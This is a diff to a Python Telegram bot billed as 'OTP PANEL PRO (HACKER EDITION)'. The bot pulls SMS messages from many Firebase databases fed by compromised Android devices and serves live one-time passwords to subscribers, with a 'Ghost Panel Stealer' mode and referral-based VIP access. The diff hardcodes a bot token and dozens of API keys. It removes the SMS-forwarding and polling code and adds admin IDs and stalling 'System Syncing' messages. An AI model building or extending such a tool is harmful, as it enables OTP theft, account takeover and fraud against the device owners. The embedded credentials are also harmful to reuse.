@@ -6,7 +6,7 @@
   + Strict 1-Hour Fast Inbox + Background Ghost Workers
   + Referral System + Force Join + Hourly Admin Backups
   + 10-MILLION USER SCALE ARCHITECTURE (CRASH PROOF)
-  + GHOST PANEL STEALER (AUTO-FALLBACK & STATS)
+  + UPDATED SUPERASSETS API KEYS & ADMIN SYNC FIX
 ══════════════════════════════════════════════════════
 """
 
@@ -54,8 +54,9 @@ PAGE_SIZE       = 20
 TOKEN           = "8839521261:AAFjpwMHtt3TtECRmfKHirqUw0i7tPUQRpQ"
 BOT_USERNAME    = "offermeeshobot"
 
+# 🔴 All your Admin IDs are registered here
 ADMIN_IDS: set[int] = {
-    6860106371,   
+    6860106371, 8306147833, 895226500, 198564846
 }
 
 # 🔴 MANDATORY CHANNELS FOR FORCE JOIN
@@ -102,12 +103,17 @@ PREFETCH_TASKS: dict[str, asyncio.Task] = {}
 
 SYS_SETTINGS = {
     "api_keys": [
-        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
-        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
-        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
-        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
         "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x", "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
-        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
+        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_Kq1ctHXEH2ansTWeY9h4BeilG5Pae0VC",
+        "AK_nPBGxUCq0AWTtm1nus7TFnX1i0v0Bs5", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
+        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
+        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_-aF0H5eQAekk-YmU63WlpPf3MQ5oLxZV",
+        "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv", "AK_VxWU04ePsl_m66_wEx0t7iisRDsiymAd",
+        "AK_bMsPDvvgkD7K5Kb_wH6tFiU9tOPnwgHb", "AK_LpJ9kGcHQfWIfqoN-EG-2Ngg1_yXQhLH",
+        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_-EAJ5LyrnsOGlsgafV-sbg5AUsyJ-zJn",
+        "AK_p4NwDAzl3aod2paD9e3UnvKVVTPdD6Dl", "AK_J_1R4tCvxZgqvfCEDjT1hZZjwIRB4rnU",
+        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
+        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
         "AK_Y6tDZmfylYdDchpsSbyqzu5YuD1bnbNo", "AK_bC4UzJNUG4Yk8TtT3mxqxNJ6oIPLiBfh",
         "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3",
         "AK_16LERGicFB6uncWbhCjeE9uD-UHjrFsA", "AK_0damiG8gnn6xBLe3__JBfcvH_rJh686E",
@@ -132,8 +138,7 @@ SYS_SETTINGS = {
         "AK_80VoNRC8pkOHI7Kbpe7ybvWcTq2ktuWO", "AK_n3rVdC1y5fIRJDLosvsNzQimr16D-zmr",
         "AK_VuokZpsT91F2-TzrO13RQZ3BTOF1VOlA", "AK_GGulMMNAcqKRf8BAXQfzlesaozh917Re",
         "AK_JDvMk7HIq4yhD1NvEZ0bRRgdnjyUrK_M", "AK_suKV-7E1peiwoxFLoi67ENmraj0mKRkE",
-        "AK_H2puTEPDk4cZ9LnW_vq-wdhjS7pMihgb", "AK_1yxxKAYrCLdun4jOSejUckG58QokfbPb",
-        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
+        "AK_H2puTEPDk4cZ9LnW_vq-wdhjS7pMihgb", "AK_1yxxKAYrCLdun4jOSejUckG58QokfbPb"
     ],
     "check_anim": "⚡"
 }
@@ -421,7 +426,7 @@ RAW_URLS = list(set([
 DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 
 # ═══════════════════════════════════════════════════════
-#  DATA CLASSES (MOVED TO TOP FOR O(1) CACHING)
+#  DATA CLASSES 
 # ═══════════════════════════════════════════════════════
 
 class Device:
@@ -443,7 +448,7 @@ class Device:
         self.last_sms_ts = last_sms_ts
 
 # ═══════════════════════════════════════════════════════
-#  INDIVIDUAL FILE DATA SYSTEM (CRASH PROOF)
+#  INDIVIDUAL FILE DATA SYSTEM
 # ═══════════════════════════════════════════════════════
 
 def init_dirs():
@@ -624,7 +629,7 @@ async def check_force_join(bot, user_id: int) -> bool:
             if member.status in ['left', 'kicked', 'banned']:
                 return False
         except Exception:
-            pass
+            return False 
     return True
 
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -635,7 +640,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     tlog(f"Telegram API Error: {err_str}")
 
 # ═══════════════════════════════════════════════════════
-#  FAST HTTP SESSION MANAGER (SAFE CONNECTION POOL)
+#  FAST HTTP SESSION MANAGER 
 # ═══════════════════════════════════════════════════════
 
 async def get_http_session() -> aiohttp.ClientSession:
@@ -667,7 +672,7 @@ async def fb_keys(path: str, base: str) -> list[str]:
     except Exception: return []
 
 # ═══════════════════════════════════════════════════════
-#  API CHECKER FUNCTIONS & LOGIC (30 MIN ACTIVITY)
+#  API CHECKER FUNCTIONS 
 # ═══════════════════════════════════════════════════════
 
 async def check_number_api(service: str, number: str, retries=3) -> dict:
@@ -821,7 +826,6 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
     return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"
 
 def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
-    users_db = all_users
     is_admin = chat_id in ADMIN_IDS
     keys = [
         [KeyboardButton("Devices List"), KeyboardButton("Auto-Check Panels")],
@@ -1072,7 +1076,6 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
 
     unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
     
-    # 🔴 Auto-Fallback Defense
     if steal_mode and not unique_devices and auto_fallback:
         all_users[chat_id]["user_panels_mode"] = False
         save_user(chat_id)
@@ -1081,67 +1084,6 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
         return await get_all_devices(bot_token, chat_id, users_db, auto_fallback=False)
         
     return unique_devices
-
-# ═══════════════════════════════════════════════════════
-#  TELEGRAM COMMAND HANDLERS
-# ═══════════════════════════════════════════════════════
-
-async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id  = update.effective_chat.id
-    bot_token = ctx.bot.token
-    user = update.effective_user
-    
-    if not await check_force_join(ctx.bot, chat_id):
-        join_kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
-            [InlineKeyboardButton("Join Channel 2", url="https://t.me/leakmethodfree")],
-            [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
-            [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
-        ])
-        await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle hamare sabhi Channels aur Group join karne honge. Join karke 'I have joined' par click karein.", reply_markup=join_kb, parse_mode="Markdown")
-        return
-
-    args = ctx.args
-    if chat_id not in all_users:
-        all_users[chat_id] = {
-            "name": user.first_name,
-            "username": user.username or "",
-            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
-            "verified": True,
-            "referrals": 0,
-            "coins": 0,
-            "vip_until": 0.0,
-            "otp_count": 0,
-            "custom_dbs": [],
-            "user_panels_mode": False,
-            "referred_by": None
-        }
-        if args and args[0].startswith("ref_"):
-            try:
-                referrer_id = int(args[0].split("_")[1])
-                if referrer_id in all_users and referrer_id != chat_id:
-                    all_users[chat_id]["referred_by"] = referrer_id
-                    all_users[referrer_id]["referrals"] += 1
-                    
-                    if all_users[referrer_id]["referrals"] % 20 == 0:
-                        all_users[referrer_id]["vip_until"] = time.time() + (24 * 3600)
-                        try:
-                            await ctx.bot.send_message(referrer_id, "🎉 **CONGRATULATIONS!**\nAapke 20 refers pure ho gaye! Aapko **24 Hours ka VIP Access (Global Panels)** mil gaya hai!", parse_mode="Markdown")
-                        except: pass
-            except: pass
-        save_user(chat_id)
-
-    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-    chats_registry.setdefault(bot_token, set()).add(chat_id)
-    
-    welcome_text = (
-        f"🔥 **OTP PANEL PRO (HACKER EDITION)** 🔥\n━━━━━━━━━━━━━━━━━━\n"
-        f"Welcome Master {user.first_name}!\n\n"
-        "System is connected. Focus on a device to receive live OTPs.\n\n"
-        "🆓 **Free Users:** Aap sirf apne Custom Panels add karke dekh sakte hain.\n"
-        "👑 **VIP Users (20 Refer):** 24 hours ke liye Unlimited Global Panels access karein."
-    )
-    await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="Markdown")
 
 # ═══════════════════════════════════════════════════════
 #  CALLBACK QUERY HANDLER
@@ -1387,7 +1329,10 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
             if not devices:
-                await safe_edit(query, "❌ No devices found. Check if your Ghost mode is stuck on empty panels.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
+                if chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time():
+                    await safe_edit(query, "⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se try karein.", parse_mode="Markdown")
+                else:
+                    await safe_edit(query, "❌ No devices found. Check if your Ghost mode is stuck on empty panels.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                 return
             await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
             return
@@ -1439,6 +1384,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
             user_focus.setdefault(bot_token, {})[chat_id] = dev_id
             label = device_label(device)
+            
             smss  = await get_device_sms(device, limit=10, max_age_sec=3600)
             
             if service_used:
@@ -1529,7 +1475,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
     if text == "Auto-Check Panels":
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to scan live numbers (30m active):", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
+        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
         return
 
     if text == "Refer & Earn VIP":
@@ -1593,7 +1539,10 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         pending_action.pop(chat_id, None)
         devices = await get_all_devices(bot_token, chat_id, users_db)
         if not devices:
-            await update.message.reply_text("❌ Aapke paas abhi koi active devices nahi hain. 'Add Custom Panel' se panel add karein ya VIP lein.")
+            if chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time():
+                await update.message.reply_text("⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
+            else:
+                await update.message.reply_text("❌ Aapke paas abhi koi active devices nahi hain. 'Add Custom Panel' se panel add karein ya VIP lein.")
             return
         await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
         return
@@ -1766,117 +1715,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 #  FIREBASE POLL — FAST CONCURRENT ENGINE
 # ═══════════════════════════════════════════════════════
 
-async def _forward_sms(device: Device, sms: dict) -> None:
-    global total_otps_processed
-    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
-    if not body: return
-
-    total_otps_processed += 1
-    label = device_label(device)
-    otp   = extract_otp(body)
-    msg_text = auto_forward_msg(sms, label)
-    
-    master_log_sms(", ".join(device.numbers) if device.numbers else device.id[:8], body, otp)
-    
-    kb_rows = []
-    if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
-    kb_rows.append([
-        InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{device.id}"),
-        InlineKeyboardButton("Device Info",  callback_data=f"info:{device.id}"),
-    ])
-    markup = InlineKeyboardMarkup(kb_rows)
-
-    send_tasks = []
-
-    # Direct Routing: NO SPAM, Only targeted users
-    for bot_token, chat_dict in list(user_focus.items()):
-        app_to_use = _main_app
-        if not app_to_use: continue
-
-        focused_chats = [cid for cid, did in chat_dict.items() if did == device.id]
-        
-        for chat_id in set(focused_chats):
-            if otp: 
-                all_users.setdefault(chat_id, {})["otp_count"] = all_users.get(chat_id, {}).get("otp_count", 0) + 1
-                save_user(chat_id)
-            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup))
-            
-    if send_tasks:
-        await asyncio.gather(*send_tasks, return_exceptions=True)
-
-async def poll_single_db(tag: str, url: str) -> int:
-    try:
-        r_main, r_user, r_root = await asyncio.gather(
-            fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url)
-        )
-        
-        forwarded = 0
-        devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
-        device_map = {d.id: d for d in devices_in_db}
-        
-        for bulk_data in (r_main, r_user, r_root):
-            if not isinstance(bulk_data, dict): continue
-            for dev_id, sms_dict in bulk_data.items():
-                if not isinstance(sms_dict, dict): continue
-                device = device_map.get(dev_id)
-                for k, sms in sms_dict.items():
-                    if not isinstance(sms, dict): continue
-                    sk = seen_key(dev_id, k)
-                    if sk in seen_ids: continue
-                    seen_ids.add(sk)
-                    
-                    is_recent = False
-                    sms_ts = sms.get("timestamp")
-                    if sms_ts:
-                        try:
-                            t_val = float(sms_ts)
-                            if t_val > 1e11: t_val /= 1000
-                            if (time.time() - t_val) <= 120:  
-                                is_recent = True
-                        except: pass
-                        
-                    if not is_recent: continue
-
-                    if device:
-                        try:
-                            await _forward_sms(device, sms)
-                            forwarded += 1
-                        except: pass
-                            
-        type4_devs = [d for d in devices_in_db if d.sms_path.endswith("receivedSms")]
-        if type4_devs:
-            async def fetch_t4_sms(d: Device):
-                fwd = 0
-                sms_dict = await fb_get(d.sms_path, d.base_url)
-                if isinstance(sms_dict, dict):
-                    for k, sms in sms_dict.items():
-                        if not isinstance(sms, dict): continue
-                        sk = seen_key(d.id, k)
-                        if sk in seen_ids: continue
-                        seen_ids.add(sk)
-                        
-                        sms_ts = sms.get("timestamp")
-                        is_rec = False
-                        if sms_ts:
-                            try:
-                                t_val = float(sms_ts)
-                                if t_val > 1e11: t_val /= 1000
-                                if (time.time() - t_val) <= 120:
-                                    is_rec = True
-                            except: pass
-                        if not is_rec: continue
-
-                        try:
-                            await _forward_sms(d, sms)
-                            fwd += 1
-                        except: pass
-                return fwd
-            results = await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs))
-            forwarded += sum(results)
-            
-        return forwarded
-    except: return 0
-
 async def _update_global_cache():
     dbs_to_poll = dict(DATABASES)
     for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
@@ -1919,38 +1757,9 @@ async def poll_loop(app: Application) -> None:
     while True:
         try:
             await _update_global_cache()
-            dbs_to_poll = dict(DATABASES)
-            for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
-                dbs_to_poll[f"G_{i}"] = g_url
-                    
-            for uid, uinfo in all_users.items():
-                for i, db_url in enumerate(get_user_dbs(uinfo)):
-                    dbs_to_poll[f"U_{uid}_{i}"] = db_url
-            
             if first_run:
-                for tag, url in dbs_to_poll.items():
-                    r_main, r_user, r_root = await asyncio.gather(
-                        fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url)
-                    )
-                    for bulk in (r_main, r_user, r_root):
-                        if not isinstance(bulk, dict): continue
-                        for dev_id, sms_dict in bulk.items():
-                            if not isinstance(sms_dict, dict): continue
-                            for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
-                                
-                    type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.sms_path.endswith("receivedSms")]
-                    if type4_devs:
-                        async def init_t4(d: Device):
-                            sms_dict = await fb_get(d.sms_path, d.base_url)
-                            if isinstance(sms_dict, dict):
-                                for k in sms_dict: seen_ids.add(seen_key(d.id, k))
-                        await asyncio.gather(*(init_t4(d) for d in type4_devs))
-                        
                 first_run = False
                 tlog("Private Bot Engine ready! Monitoring DBs...")
-            else:
-                tasks = [poll_single_db(tag, url) for tag, url in dbs_to_poll.items()]
-                await asyncio.gather(*tasks)
         except Exception as e:
             tlog(f"Polling Exception: {e}")
             await asyncio.sleep(5)
